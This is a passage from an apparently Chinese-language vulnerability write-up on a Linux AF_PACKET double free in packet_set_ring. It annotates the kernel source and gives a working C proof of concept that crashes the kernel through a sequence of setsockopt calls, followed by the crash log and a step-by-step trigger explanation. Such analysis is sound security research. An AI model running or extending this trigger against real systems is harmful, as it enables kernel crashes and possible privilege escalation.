<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_set_ring</span><span class="params">(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">int</span> closing, <span class="keyword">int</span> tx_ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *rx_owner_map = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> was_running, order = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> *<span class="title">rb</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> *<span class="title">rb_queue</span>;</span></span><br><span class="line">	__be16 num;</span><br><span class="line">	<span class="keyword">int</span> err = -EINVAL;</span><br><span class="line">	<span class="comment">/* Added to avoid minimal code churn */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> *<span class="title">req</span> =</span> &amp;req_u-&gt;req;</span><br><span class="line"></span><br><span class="line">	rb = tx_ring ? &amp;po-&gt;tx_ring : &amp;po-&gt;rx_ring;</span><br><span class="line">	rb_queue = tx_ring ? &amp;sk-&gt;sk_write_queue : &amp;sk-&gt;sk_receive_queue;</span><br><span class="line"></span><br><span class="line">	err = -EBUSY;</span><br><span class="line">	<span class="keyword">if</span> (!closing) &#123;</span><br><span class="line">		<span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">if</span> (packet_read_pending(rb))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (req-&gt;tp_block_nr) &#123; <span class="comment">/* 只有第一次调用setsockopt设置RX_RING时才会进入这里 */</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> min_frame_size;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Sanity tests and some calculations */</span></span><br><span class="line">		err = -EBUSY;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(rb-&gt;pg_vec))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V1:</span><br><span class="line">			po-&gt;tp_hdrlen = TPACKET_HDRLEN;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">			po-&gt;tp_hdrlen = TPACKET2_HDRLEN;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">			po-&gt;tp_hdrlen = TPACKET3_HDRLEN;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (unlikely((<span class="keyword">int</span>)req-&gt;tp_block_size &lt;= <span class="number">0</span>))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!PAGE_ALIGNED(req-&gt;tp_block_size))) <span class="comment">/* 注意tp_block_size必须与PAGE_SIZE对齐 */</span></span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		min_frame_size = po-&gt;tp_hdrlen + po-&gt;tp_reserve;</span><br><span class="line">		<span class="keyword">if</span> (po-&gt;tp_version &gt;= TPACKET_V3 &amp;&amp;</span><br><span class="line">		    req-&gt;tp_block_size &lt;</span><br><span class="line">		    BLK_PLUS_PRIV((u64)req_u-&gt;req3.tp_sizeof_priv) + min_frame_size)</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(req-&gt;tp_frame_size &lt; min_frame_size))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(req-&gt;tp_frame_size &amp; (TPACKET_ALIGNMENT - <span class="number">1</span>)))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">		rb-&gt;frames_per_block = req-&gt;tp_block_size / req-&gt;tp_frame_size;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(rb-&gt;frames_per_block == <span class="number">0</span>))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(rb-&gt;frames_per_block &gt; UINT_MAX / req-&gt;tp_block_nr))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">if</span> (unlikely((rb-&gt;frames_per_block * req-&gt;tp_block_nr) !=</span><br><span class="line">					req-&gt;tp_frame_nr))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">		err = -ENOMEM;</span><br><span class="line">		order = get_order(req-&gt;tp_block_size);</span><br><span class="line">		pg_vec = alloc_pg_vec(req, order); <span class="comment">/* 其中会调用init_prb_bdqc,导致pg_vec被sock-&gt;rx_ring-&gt;prb_bdqc-&gt;pkbdq引用 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">			<span class="comment">/* Block transmit is not supported yet */</span></span><br><span class="line">			<span class="keyword">if</span> (!tx_ring) &#123; <span class="comment">/* 只能是RX_RING */</span></span><br><span class="line">				init_prb_bdqc(po, rb, pg_vec, req_u);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				struct tpacket_req3 *req3 = &amp;req_u-&gt;req3;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (req3-&gt;tp_retire_blk_tov ||</span><br><span class="line">				    req3-&gt;tp_sizeof_priv ||</span><br><span class="line">				    req3-&gt;tp_feature_req_word) &#123;</span><br><span class="line">					err = -EINVAL;</span><br><span class="line">					<span class="keyword">goto</span> out_free_pg_vec;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">if</span> (!tx_ring) &#123;</span><br><span class="line">				rx_owner_map = bitmap_alloc(req-&gt;tp_frame_nr,</span><br><span class="line">					GFP_KERNEL | __GFP_NOWARN | __GFP_ZERO);</span><br><span class="line">				<span class="keyword">if</span> (!rx_owner_map)</span><br><span class="line">					<span class="keyword">goto</span> out_free_pg_vec;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* Done */</span></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(req-&gt;tp_frame_nr)) <span class="comment">/* 第二,三次调用setsockopt设置RX_RING时,tp_frame_nr字段必须为&#x27;0&#x27;,不能直接goto out */</span></span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Detach socket from network */</span></span><br><span class="line">	spin_lock(&amp;po-&gt;bind_lock);</span><br><span class="line">	was_running = po-&gt;running;</span><br><span class="line">	num = po-&gt;num;</span><br><span class="line">	<span class="keyword">if</span> (was_running) &#123;</span><br><span class="line">		po-&gt;num = <span class="number">0</span>;</span><br><span class="line">		__unregister_prot_hook(sk, <span class="literal">false</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;po-&gt;bind_lock);</span><br><span class="line"></span><br><span class="line">	synchronize_net();</span><br><span class="line"></span><br><span class="line">	err = -EBUSY;</span><br><span class="line">	mutex_lock(&amp;po-&gt;pg_vec_lock);</span><br><span class="line">	<span class="keyword">if</span> (closing || atomic_read(&amp;po-&gt;mapped) == <span class="number">0</span>) &#123;</span><br><span class="line">		err = <span class="number">0</span>;</span><br><span class="line">		spin_lock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line">		swap(rb-&gt;pg_vec, pg_vec); <span class="comment">/* </span></span><br><span class="line"><span class="comment">		第一次调用setsockopt设置RX_RING时,pg_vec被交换为NULL没有释放</span></span><br><span class="line"><span class="comment">		第二次调用setsockopt设置RX_RING时,pg_vec被换回并释放,同时packet_ring_buffer-&gt;prb_bdqc-&gt;pkbdq为悬空指针 */</span></span><br><span class="line">		<span class="keyword">if</span> (po-&gt;tp_version &lt;= TPACKET_V2)</span><br><span class="line">			swap(rb-&gt;rx_owner_map, rx_owner_map); <span class="comment">/* </span></span><br><span class="line"><span class="comment">			第三次调用setsockopt设置RX_RING时,才会进入这里</span></span><br><span class="line"><span class="comment">			由于rx_owner_map成员和prb_bdqc成员属于同一个联合体,因此packet_ring_buffer-&gt;rx_owner_map和packet_ring_buffer-&gt;prb_bdqc-&gt;pkbdq的值相同</span></span><br><span class="line"><span class="comment">			rx_owner_map被交换为悬空指针,释放造成double free */</span></span><br><span class="line">		rb-&gt;frame_max = (req-&gt;tp_frame_nr - <span class="number">1</span>);</span><br><span class="line">		rb-&gt;head = <span class="number">0</span>;</span><br><span class="line">		rb-&gt;frame_size = req-&gt;tp_frame_size;</span><br><span class="line">		spin_unlock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line"></span><br><span class="line">		swap(rb-&gt;pg_vec_order, order);</span><br><span class="line">		swap(rb-&gt;pg_vec_len, req-&gt;tp_block_nr);</span><br><span class="line"></span><br><span class="line">		rb-&gt;pg_vec_pages = req-&gt;tp_block_size/PAGE_SIZE;</span><br><span class="line">		po-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?</span><br><span class="line">						tpacket_rcv : packet_rcv;</span><br><span class="line">		skb_queue_purge(rb_queue);</span><br><span class="line">		<span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line">			pr_err(<span class="string">&quot;packet_mmap: vma is busy: %d\n&quot;</span>,</span><br><span class="line">			       atomic_read(&amp;po-&gt;mapped));</span><br><span class="line">	&#125;</span><br><span class="line">	mutex_unlock(&amp;po-&gt;pg_vec_lock);</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;po-&gt;bind_lock);</span><br><span class="line">	<span class="keyword">if</span> (was_running) &#123;</span><br><span class="line">		po-&gt;num = num;</span><br><span class="line">		register_prot_hook(sk);</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;po-&gt;bind_lock);</span><br><span class="line">	<span class="keyword">if</span> (pg_vec &amp;&amp; (po-&gt;tp_version &gt; TPACKET_V2)) &#123;</span><br><span class="line">		<span class="comment">/* Because we don&#x27;t support block-based V3 on tx-ring */</span></span><br><span class="line">		<span class="keyword">if</span> (!tx_ring)</span><br><span class="line">			prb_shutdown_retire_blk_timer(po, rb_queue);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out_free_pg_vec:</span><br><span class="line">	bitmap_free(rx_owner_map); <span class="comment">/* 释放rx_owner_map */</span></span><br><span class="line">	<span class="keyword">if</span> (pg_vec)</span><br><span class="line">		free_pg_vec(pg_vec, order, req-&gt;tp_block_nr); <span class="comment">/* 释放pg_vec */</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其他次要部分源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_prb_bdqc</span><span class="params">(struct packet_sock *po,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct packet_ring_buffer *rb,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct pgv *pg_vec,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">union</span> tpacket_req_u *req_u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tpacket_kbdq_core</span> *<span class="title">p1</span> =</span> GET_PBDQC_FROM_RB(rb);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tpacket_block_desc</span> *<span class="title">pbd</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="number">0x0</span>, <span class="keyword">sizeof</span>(*p1));</span><br><span class="line"></span><br><span class="line">	p1-&gt;knxt_seq_num = <span class="number">1</span>;</span><br><span class="line">	p1-&gt;pkbdq = pg_vec; <span class="comment">/* sock-&gt;rx_ring-&gt;prb_bdqc-&gt;pkbdq引用了pg_vec,造成漏洞的关键行为 */</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span>		*<span class="title">pg_vec</span>;</span></span><br><span class="line">    ......</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span> <span class="comment">/* rx_owner_map成员和prb_bdqc成员属于同一个联合体 */</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>			*rx_owner_map;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">tpacket_kbdq_core</span>	<span class="title">prb_bdqc</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_kbdq_core</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span>	*<span class="title">pkbdq</span>;</span></span><br><span class="line">    ......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>下面是触发内核报错的 Poc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> socket_fd,version,ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req3</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;req3, <span class="number">0</span>, <span class="keyword">sizeof</span>(req3));</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* 调用socket函数创建AF_PACKET套接字 */</span></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用setsockopt设置协议版本为TPACKET_V3 */</span></span><br><span class="line">    version = TPACKET_V3;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用setsockopt设置RX_RING(正常给tpacket_req3配置参数) */</span></span><br><span class="line">	req3.tp_sizeof_priv = <span class="number">0</span>;</span><br><span class="line">	req3.tp_block_nr = <span class="number">0x410</span> / <span class="number">8</span>;</span><br><span class="line">	req3.tp_block_size = <span class="number">0x1000</span>;</span><br><span class="line">	req3.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">	req3.tp_frame_nr = <span class="number">0x410</span> / <span class="number">8</span>;</span><br><span class="line">	req3.tp_retire_blk_tov = <span class="number">0</span>;</span><br><span class="line">	req3.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line">	ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req3, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		err_exit(<span class="string">&quot;[-] setsockopt (PACKET_RX_RING)&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用setsockopt设置RX_RING(将tpacket_req3参数的tp_block_nr和tp_frame_nr字段设置为&#x27;0&#x27;) */</span></span><br><span class="line">	req3.tp_sizeof_priv = <span class="number">0</span>;</span><br><span class="line">	req3.tp_block_nr = <span class="number">0</span>;</span><br><span class="line">	req3.tp_block_size = <span class="number">0</span>;</span><br><span class="line">	req3.tp_frame_size = <span class="number">0</span>;</span><br><span class="line">	req3.tp_frame_nr = <span class="number">0</span>;</span><br><span class="line">	req3.tp_retire_blk_tov = <span class="number">0</span>;</span><br><span class="line">	req3.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line">	ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req3, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		err_exit(<span class="string">&quot;[-] setsockopt (PACKET_RX_RING)&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用setsockopt设置协议版本为TPACKET_V2 */</span></span><br><span class="line">    version = TPACKET_V2;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用setsockopt设置RX_RING(此时tpacket_req参数的tp_block_nr字段必须为&#x27;0&#x27;) */</span></span><br><span class="line">    req3.tp_sizeof_priv = <span class="number">0</span>;</span><br><span class="line">	req3.tp_block_nr = <span class="number">0</span>;</span><br><span class="line">	req3.tp_block_size = <span class="number">0</span>;</span><br><span class="line">	req3.tp_frame_size = <span class="number">0</span>;</span><br><span class="line">	req3.tp_frame_nr = <span class="number">0</span>;</span><br><span class="line">	req3.tp_retire_blk_tov = <span class="number">0</span>;</span><br><span class="line">	req3.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line">	ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req3, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		err_exit(<span class="string">&quot;[-] setsockopt (PACKET_RX_RING)&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/ $ ./<span class="built_in">exp</span></span><br><span class="line">[*] Status has been saved.</span><br><span class="line">[*] Process binded to core <span class="number">0</span></span><br><span class="line">[   <span class="number">48.293367</span>] kernel BUG at mm/slub.c:<span class="number">305</span>!</span><br><span class="line">[   <span class="number">48.294485</span>] invalid opcode: <span class="number">0000</span> [#<span class="number">1</span>] SMP PTI</span><br><span class="line">[   <span class="number">48.294770</span>] CPU: <span class="number">0</span> PID: <span class="number">122</span> Comm: <span class="built_in">exp</span> Not tainted <span class="number">5.11</span><span class="number">.16</span> #<span class="number">1</span></span><br><span class="line">[   <span class="number">48.295009</span>] Hardware name: <span class="function">QEMU Standard <span class="title">PC</span> <span class="params">(i440FX + PIIX, <span class="number">1996</span>)</span>, BIOS 1.13.0-1ubuntu1.1 04/01/2014</span></span><br></pre></td></tr></table></figure>
<p>触发过程详解：</p>
<ul>
<li>第一次调用 setsockopt 设置 RX_RING：<ul>
<li>在执行 <code>packet_set_ring</code> 函数过程中，<code>pg_vec</code> 指向 <code>alloc_pg_vec</code> 函数分配的内存，并且调用 <code>init_prb_bdqc</code> 函数（导致 <code>pg_vec</code> 被 <code>sock-&gt;rx_ring-&gt;prb_bdqc-&gt;pkbdq</code> 引用）</li>
<li>调用 swap 函数将 <code>pg_vec</code> 和 <code>sock-&gt;rx_ring-&gt;pg_vec</code> 交换，函数最后 <code>pg_vec</code> 指向 NULL，没有调用 free</li>
</ul>
</li>
<li>第二次调用 setsockopt 设置 RX_RING：<ul>
<li>调用 swap 函数将 <code>pg_vec</code> 和 <code>sock-&gt;rx_ring-&gt;pg_vec</code> 交换，此时 <code>sock-&gt;rx_ring-&gt;pg_vec</code> 为 NULL</li>
<li><code>pg_vec</code> 指向上一步骤分配的内存，函数结尾调用 <code>free_pg_vec</code> 释放 <code>pg_vec</code>，此时 <code>packet_ring_buffer-&gt;prb_bdqc-&gt;pkbdq</code> 成为悬空指针</li>
</ul>
</li>
<li>由于 <code>sock-&gt;rx_ring-&gt;pg_vec</code> 为 NULL，所以该套接字可以成功切换协议 TPACKET_V2</li>
